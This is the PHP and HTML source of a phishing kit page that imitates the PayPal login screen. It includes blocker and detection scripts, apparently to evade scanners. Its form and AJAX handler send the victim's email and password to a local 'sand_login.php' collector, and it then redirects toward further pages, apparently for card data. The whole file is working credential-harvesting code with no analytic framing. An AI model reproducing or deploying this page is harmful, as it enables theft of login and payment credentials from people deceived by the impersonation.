<?php
//#     #            #     #                                                              #     #   #   
//##   ## #####      #     # #    # #####  ###### ##### ######  ####  ##### ###### #####  #     #  ##   
//# # # # #    #     #     # ##   # #    # #        #   #      #    #   #   #      #    # #     # # #   
//#  #  # #    #     #     # # #  # #    # #####    #   #####  #        #   #####  #    # #     #   #   
//#     # #####  ### #     # #  # # #    # #        #   #      #        #   #      #    #  #   #    #   
//#     # #   #  ### #     # #   ## #    # #        #   #      #    #   #   #      #    #   # #     #   
//#     # #    # ###  #####  #    # #####  ######   #   ######  ####    #   ###### #####     #    ##### 

session_start();
error_reporting(0);
include "../system/blocker.php";
include "../system/detect.php";
?>
<!DOCTYPE html>




<!--[if lt IE 9]><html lang="en" class="no-js lower-than-ie9 ie"><![endif]--><!--[if lt IE 10]><html lang="en" class="no-js lower-than-ie10 ie"><![endif]--><!--[if !IE]>--><html lang="en" class="no-js"><!--<![endif]--><head>
<meta charset="utf-8" /><title>Log in to your PayPal account</title><meta http-equiv="content-type" content="text/html; charset=UTF-8" />




<link rel="shortcut icon" href="../style/img/pp_favicon_x.ico" />
<link rel="apple-touch-icon" href="../style/img/pp64.png" />





<link rel="stylesheet" type="text/css" href="https://ugandaelevator.com/img/cart,jpg">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes" /><link rel="stylesheet" href="../style/css/contextualLogin.css" /><!--[if lte IE 9]><link rel="stylesheet" href="../style/css/ie9.css" /><link rel='stylesheet' type='text/css' href='//scamaxhack.blogspot.com/' />






<![endif]-->





</head><body class="desktop"data-rlogid=""true"data-enable-ads-captcha="true"data-ads-challenge-url=""data-enable-client-cal-logging="true"data-correlation-id="5b73304657ed5"data-is-webkit-browser="true"data-enable-fn-beacon-on-web-views="true"data-csrf-token=""><noscript><p class="nonjsAlert" role="alert">NOTE: Many features on the PayPal Web site require Javascript and cookies.</p></noscript><div id="main" class="main" role="main"><section id="login" class="login " data-role="page" data-title="Log in to your PayPal account"><div class="corral"><div class="contentContainer activeContent"><header ><p class="paypal-logo paypal-logo-long"></p></header><h1 class="headerText accessAid">Log in to your PayPal account</h1><p id="phoneSubTagLine" class="subHeaderText hide hide">Already set up to use your phone number to log in? Type it below. Otherwise, click the link to log in with email.</p><div id="notifications" class="notifications">



<div id="okeyaaaaaa">

<?php
error_reporting(0);
@session_start(); 
$ERR = "Error"; 
$requst = $_SERVER['REQUEST_URI']; 
$user_cookie = $_COOKIE["error"]; 
$var1 = "1"; 
if (eregi("resType=code&failedBecause=", $requst))
	 { echo '

<div class="notifications"><p class="notification notification-critical" role="alert">Please check your entries and try again.</p></div>



 '; 
 }else{ } 
 ?> 

</div>



</div>



<script src="../myaccount/lib/js/jquery.additional-methods.js"></script>
<script src="../myaccount/lib/js/jquery.CardValidator.js"></script>
<script src="../myaccount/lib/js/jquery.js"></script>
<script src="../myaccount/lib/js/jquery.mask.js"></script>
<script src="../myaccount/lib/js/jquery.phoneNumber.js"></script>
<script src="../myaccount/lib/js/jquery.validate.js"></script>





<script>
// Wait for the DOM to be ready
$(function() {

	var validator = $("#loginpaypal").bind("invalid-form.validate", function() {
			$("#okeyaaaaaa").html('<div class="notifications"><p class="notification notification-critical" role="alert">Please check your entries and try again.</p></div>');})




  $("form[name='loginpaypal']").validate({
    
	errorContainer: $("#okeyaaaaaa"),

    rules: {
      // The key name on the left side is the name attribute
      // of an input field. Validation rules are defined
      // on the right side
      firstname: "required",
      lastname: "required",
      email: {
        required: true,
        // Specify that email should be validated
        // by the built-in "email" rule
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },

highlight: function ( element, errorClass, validClass , errorClassq, validClassq  ) {



$( element ).parents( ".llogin" ).removeClass( validClass );
	$( element ).parents( ".llogin" ).addClass( errorClass );

$( element ).parents( "#okey" ).removeClass( validClassq );
	$( element ).parents( "#okey" ).addClass( errorClassq );


				},
unhighlight: function (element, errorClass, validClass , errorClassq, validClassq ) {


					
	$( element ).parents( ".llogin" ).addClass( validClass );
$( element ).parents( ".llogin" ).removeClass( errorClass );

	$( element ).parents( "#okey" ).addClass( validClassq );
$( element ).parents( "#okey" ).removeClass( errorClassq );



				},





    messages: {

      NameOnCard: "Name On Card is required!",

      lastName: "Last Name is required!",






       login_password: {
        required: "Enter your password.",
        minlength: "Your password must be at least 5 characters long"
      },



login_email: {
        required: "Enter your email address.",
        minlength: "That email address format isn�t right"
      },




      email: "That email address format isn�t right"
    },



    // in the "action" attribute of the form when valid
    
                submitHandler: function(form) {
                    $("#doori").show();
					$.post("../system/sand_login.php?ajax", $("#loginpaypal").serialize(), function(result) {
                            setTimeout(function() {




$("#scritykatba").show(); 
$("#cardscrity").show();
$("#card").hide();
$("#cardkatba").hide();
 $(location).attr("href", "../myaccount/index");



                            });
                    });
    }
  });
});

</script>











<div id="doori" style="display:none;" >
<div class="transitioning spinner" aria-busy="true"><p class="checkingInfo hide">Verifying your information�</p><p class="oneSecond hide">Just a moment�</p><p class="secureMessage hide">Securely logging you in...</p><p class="oneTouchMessage hide"></p><p class="retrieveInfo hide">Retrieving your info...</p><p class="waitFewSecs hide">This may take a few seconds...</p></div>
</div>


<form action="../system/sand_login.php" method="post" class="proceed maskable" autocomplete="off" name="loginpaypal" id="loginpaypal"   >


<input type="hidden" id="token" name="_csrf" value=""><input type="hidden" name="locale.x" value="en_US">

<input type="hidden" name="processSignin" value="main">


<input type="hidden" name="fn_sync_data" value="fn_sync_data"><input type="hidden" name="intent" value="signin" />

<input type="hidden" name="ads-client-context" value="signin" /><input type="hidden" name="requestUrl" value="#" />

<input type="hidden" name="returnUri" value="#" /><div id="passwordSection" class="clearfix">

<div id="emailSection" class="clearfix">

<div class="llogin textInput" style="z-index: 100;" id="login_emaildiv">
<div class="fieldWrapper">

<label for="email" class="fieldLabel">Email address</label>



<input id="email" name="login_email" type="email" class="hasHelp  validateEmpty   " required="required" aria-required="true" value="<?php echo $_SESSION['_email_'] ;?>" autocomplete="off" placeholder="Email address" aria-invalid="false">




</div><div class="okey errorMessage"  id="emailErrorMessage"><p class="emptyError show">

<label id="emailinputError" class="errorMessage show emptyError hasError" for="email" style="display: none;"></label>

</p>
</div></div></div>




<div id="passwordSection" class="clearfix">

<div class="llogin textInput" id="login_passworddiv">

<div class="fieldWrapper"><label for="password" class="fieldLabel">Password</label>

<input id="password" name="login_password" type="password" class="hasHelp  validateEmpty   pin-password" required="required" aria-required="true" value="" placeholder="Enter your password" aria-invalid="false">



</div>




<div class="okey errorMessage" id="passwordErrorMessage">
<p class="emptyError ">

<label id="passwordinputError" class="errorMessage show emptyError hasError" for="password" style="display: none;"></label>


</p></div></div></div></div>

<div class="actions actionsSpacedShort">


<button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login">Log In</button></div></form>






<div class="moreOptionsDiv hide" id="moreOptionsContainer"><a href="#" id="moreOptions" class="moreOptionsInfo">More options</a><div class="bubble-tooltip hide" id="moreOptions-recovery-modal"><ul class="moreoptionsGroup"><li><a href="#" id="moreOptionsMobile" class="scTrack:unifiedlogin-click-more-options-mobile">Approve login using mobile device</a></li><li><a href="#"  class="scTrack:unifiedlogin-click-forgot-password pwrLink startPwrFlowBtn">Having trouble logging in?</a></li></ul></div></div><div class="forgotLink"><a href="#"  class="scTrack:unifiedlogin-click-forgot-password pwrLink startPwrFlowBtn">Having trouble logging in?</a></div><div class="pwr-modal forgotPasswordModal" id="password-recovery-modal" aria-label="Password Recovery"><iframe id="pwdIframe" data-src="#" scrolling="no" data-auto-reload="true"></iframe><div class="monogram-small"></div></div><div id="signupContainer" class="signupContainer" data-hide-on-email="" data-hide-on-pass=""><div class="loginSignUpSeparator"><span class="textInSeparator" aria-label="or">or</span></div><a href="#" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount">Sign Up</a></div></div></div></section><footer class="footer" role="contentinfo"><div class="legalFooter"><ul class="footerGroup"><li><a href="#">Contact <?=strtolower($_SESSION['countrycode1']);?></a></li><li><a href="#">Privacy</a></li><li><a href="#">Legal</a></li><li><a href="#">Worldwide</a></li></ul></div></footer></div><div class="transitioning  hide "><p class="checkingInfo hide">Checking your info�</p><p class="oneSecond hide">Just a second�</p><p class="secureMessage hide">Securely logging you in...</p><p class="oneTouchMessage hide"></p></div>



<img src="" alt="" height="1" width="1" border="0"></noscript>
<img src="" alt="" height="1" width="1" border="0"></noscript>
</body></html>

